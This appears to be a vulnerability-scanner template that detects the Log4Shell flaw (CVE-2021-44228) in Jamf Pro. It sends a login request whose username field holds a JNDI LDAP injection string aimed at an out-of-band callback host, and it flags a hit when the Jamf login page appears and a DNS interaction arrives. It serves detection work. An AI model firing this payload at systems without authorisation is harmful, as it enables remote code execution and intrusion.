id: jamf-log4j-rce
brief:
    title: JamF (Log4j) - Remote Code Execution
    by: pdteam
    level: critical
    about: JamF is susceptible to remote code execution via the Apache log4j library. Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in confi...
    label:
        - cve
        - cve2021
        - rce
        - jndi
        - log4j
        - jamf
        - oast
        - kev
        - vuln
    score: CVE-2021-44228 CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/'
      head:
        Content-Type: application/x-www-form-urlencoded
        Origin: '{{RootURL}}'
        Referer: '{{RootURL}}'
      body: username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&password=
      signs:
        - "on": word
          has:
            - <title>Jamf Pro Login</title>
          in: body
          need: all
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
